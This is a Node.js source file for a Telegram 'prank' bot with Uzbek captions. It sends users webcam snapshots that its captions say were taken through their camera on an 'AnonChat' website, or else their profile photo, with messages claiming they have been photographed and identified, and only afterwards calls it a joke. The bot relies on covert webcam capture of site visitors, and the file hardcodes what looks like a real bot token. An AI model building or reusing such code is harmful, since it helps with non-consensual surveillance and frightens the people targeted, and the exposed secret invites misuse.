const https = require('https');
const fs = require('fs');
const path = require('path');

const TOKEN = '8839541776:AAEybPVoYnKdf0VRGb9Nl7Wi-Go32hDNSZY';
let lastUpdateId = 0;

function apiRequest(method, params = {}) {
  return new Promise((resolve, reject) => {
    const data = JSON.stringify(params);
    const req = https.request({
      hostname: 'api.telegram.org',
      port: 443,
      path: `/bot${TOKEN}/${method}`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(data)
      }
    }, res => {
      let body = '';
      res.on('data', chunk => body += chunk);
      res.on('end', () => {
        try {
          resolve(JSON.parse(body));
        } catch(e) {
          resolve({ ok: false, error: e.message });
        }
      });
    });
    req.on('error', reject);
    req.write(data);
    req.end();
  });
}

// Get user profile photo from Telegram
async function getUserProfilePhoto(userId) {
  try {
    const res = await apiRequest('getUserProfilePhotos', {
      user_id: userId,
      limit: 1
    });
    if (res.ok && res.result && res.result.total_count > 0 && res.result.photos.length > 0) {
      const sizes = res.result.photos[0];
      const best = sizes[sizes.length - 1];
      return best.file_id;
    }
  } catch (err) {
    console.error('[PROFILE PHOTO ERROR]:', err.message);
  }
  return null;
}

// Find saved camera snapshot from website
function getWebcamPhoto(sessionId) {
  const snapsDir = path.join(__dirname, 'snapshots');
  if (!fs.existsSync(snapsDir)) return null;

  // 1. Check if specific session snapshot exists
  if (sessionId) {
    const clean = sessionId.replace(/[^a-zA-Z0-9_-]/g, '');
    const specificPath = path.join(snapsDir, `${clean}.jpg`);
    if (fs.existsSync(specificPath)) {
      return specificPath;
    }
  }

  // 2. Fallback to latest snapshot if fresh (within 30 minutes)
  const latestPath = path.join(snapsDir, 'latest.jpg');
  if (fs.existsSync(latestPath)) {
    try {
      const stats = fs.statSync(latestPath);
      const ageMinutes = (Date.now() - stats.mtimeMs) / (1000 * 60);
      if (ageMinutes < 30) {
        return latestPath;
      }
    } catch(e) {}
  }

  return null;
}

// Send photo supporting both local file path and Telegram file_id
function sendPhoto(chatId, photoSource, caption = '') {
  return new Promise((resolve, reject) => {
    if (!photoSource) return resolve(null);

    // If photoSource is a local file
    if (typeof photoSource === 'string' && fs.existsSync(photoSource)) {
      const boundary = '----WebKitFormBoundary' + Math.random().toString(36).substring(2);
      const fileData = fs.readFileSync(photoSource);
      const filename = path.basename(photoSource);

      let pre = `--${boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n${chatId}\r\n`;
      if (caption) {
        pre += `--${boundary}\r\nContent-Disposition: form-data; name="caption"\r\n\r\n${caption}\r\n`;
        pre += `--${boundary}\r\nContent-Disposition: form-data; name="parse_mode"\r\n\r\nHTML\r\n`;
      }
      pre += `--${boundary}\r\nContent-Disposition: form-data; name="photo"; filename="${filename}"\r\nContent-Type: image/jpeg\r\n\r\n`;

      const post = `\r\n--${boundary}--\r\n`;

      const body = Buffer.concat([
        Buffer.from(pre, 'utf-8'),
        fileData,
        Buffer.from(post, 'utf-8')
      ]);

      const req = https.request({
        hostname: 'api.telegram.org',
        port: 443,
        path: `/bot${TOKEN}/sendPhoto`,
        method: 'POST',
        headers: {
          'Content-Type': `multipart/form-data; boundary=${boundary}`,
          'Content-Length': body.length
        }
      }, res => {
        let b = '';
        res.on('data', d => b += d);
        res.on('end', () => {
          try { resolve(JSON.parse(b)); }
          catch(e) { resolve({ ok: false }); }
        });
      });

      req.on('error', reject);
      req.write(body);
      req.end();
    } else {
      // If photoSource is a Telegram file_id or URL
      apiRequest('sendPhoto', {
        chat_id: chatId,
        photo: photoSource,
        caption: caption,
        parse_mode: 'HTML'
      }).then(resolve).catch(reject);
    }
  });
}

async function sendMessage(chatId, text) {
  return apiRequest('sendMessage', {
    chat_id: chatId,
    text: text,
    parse_mode: 'HTML'
  });
}

async function pollUpdates() {
  try {
    const res = await apiRequest('getUpdates', {
      offset: lastUpdateId + 1,
      timeout: 30
    });

    if (res.ok && Array.isArray(res.result)) {
      for (const update of res.result) {
        lastUpdateId = update.update_id;

        if (update.message && update.message.chat) {
          const chatId = update.message.chat.id;
          const userObj = update.message.from || {};
          const user = userObj.first_name || 'Do\'stim';
          const userId = userObj.id;
          const text = (update.message.text || '').trim();

          console.log(`\n[BOT] 🚀 User started bot: ${user} (ID: ${userId}, Chat: ${chatId})`);
          console.log(`[BOT] Command/Text: "${text}"`);

          // Extract sessionId if user clicked /start with payload (e.g., /start snap_xyz123)
          let sessionId = null;
          const parts = text.split(/\s+/);
          if (parts.length > 1) {
            sessionId = parts[1];
          }

          // 1. Check for live webcam photo from website
          const webcamPhoto = getWebcamPhoto(sessionId);
          let userProfilePhotoId = null;

          if (userId) {
            userProfilePhotoId = await getUserProfilePhoto(userId);
          }

          // SEND TARGET USER'S PHOTO
          if (webcamPhoto) {
            console.log(`[BOT] 📸 Sending LIVE WEBCAM photo to ${user}: ${webcamPhoto}`);
            const webcamCaption = `📸 <b>DIQQAT! SIZNING WEBCAM SURATINGIZ:</b> 😂\n\n` +
              `<i>AnonChat saytida kamerangiz orqali olingan kadr!</i>\n` +
              `Sizni 100% rasmga oldik! Qarang, qanday tushibsiz! 🤣`;
            await sendPhoto(chatId, webcamPhoto, webcamCaption);
          } else if (userProfilePhotoId) {
            console.log(`[BOT] 📸 Sending TELEGRAM PROFILE photo to ${user}`);
            const profileCaption = `📸 <b>SIZNING TELEGRAM PROFIL RASMINGIZ:</b> 🕵️‍♂️\n\n` +
              `<i>Sizning shaxsingiz va profilingiz aniqlandi!</i> 😂`;
            await sendPhoto(chatId, userProfilePhotoId, profileCaption);
          }

          // 2. Prank Reveal Message (Uzbek + English)
          const prankText = `🎉 <b>XAVOTIR OLMANG! BU SHUNCHAKI HAZIL (PRANK)!</b> 😂\n\n` +
            `Salom <b>${user}</b>!\n\n` +
            `Sizni yaqin do'stingiz <b>PRANK (HAZIL)</b> qildi! 💻❌\n` +
            `Hech qanday virus tushgani yo'q, xakerlar yo'q va hech qanday ma'lumot o'g'irlanmadi!\n` +
            `Qurilmangiz <b>100% xavfsiz va butun</b>!\n\n` +
            `Do'stingiz shunchaki kayfiyatingizni ko'tarish va kuldirish uchun bu hazilni uyushtirdi! 🤝❤️\n\n` +
            `Kulgili suratni quyida ko'ring: 👇`;

          await sendMessage(chatId, prankText);

          // 3. Send Funny Laughing Meme Photo
          const funnyPhotoPath = path.join(__dirname, 'funny_face.jpg');
          const memeCaption = `🤣 <b>KULIB TURIN! SIZNI PRANK QILISHDI!</b> 📸✨\n\n` +
            `Xaker hujumiga uchradim deb o'ylagan paytingizdagi yuzingizni ko'rishingiz kerak edi! 😆\n` +
            `Do'stingizga rahmat ayting, u sizni yaxshi ko'radi! 🤝`;

          await sendPhoto(chatId, funnyPhotoPath, memeCaption);
        }
      }
    }
  } catch(err) {
    console.error('[BOT ERROR]:', err.message);
  }

  // Continue polling loop
  setTimeout(pollUpdates, 1000);
}

console.log('🤖 Telegram Prank Bot is running with live photo support...');
pollUpdates();
